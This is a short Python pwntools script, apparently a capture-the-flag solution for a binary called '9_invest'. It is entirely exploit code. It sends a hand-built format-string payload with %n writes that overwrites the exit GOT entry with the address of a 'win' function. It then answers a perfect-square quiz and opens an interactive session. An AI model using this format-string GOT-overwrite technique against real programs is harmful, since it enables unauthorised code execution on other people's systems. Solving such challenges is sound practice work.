from pwn import *
import math

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./9_invest"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

def is_square(number):
    number = int(number)
    return int(math.sqrt(number)) * int(math.sqrt(number)) == number

payload = b"AA" + fmtstr_payload(30, {0x04c03c08: elf.sym['win']}, numbwritten=2)
payload = b"AA" + pack(0x0804c03c) + pack(0x804c03e) + b"%37500x%30$n" + b"%30078x%31$n"
log.info(payload)
log.info(hex(elf.got['exit']))
log.info(hex(elf.sym['win']))
p.sendlineafter("name?", payload)
p.sendlineafter("command:", "g")
p.sendlineafter("want to bet?", "1")
p.recvuntil("What is it?\n")

squares = []
squares.append(p.recvline()[4:-1].decode())
squares.append(p.recvline()[4:-1].decode())
squares.append(p.recvline()[4:-1].decode())
squares.append(p.recvline()[4:-1].decode())

index = 0
for num in squares:
    print(is_square(num))
    if not is_square(num):
        break
    if is_square(num):
        index += 1

choices = ["a", "b", "c", "d"]
pause()
p.sendline(choices[index])

p.interactive()
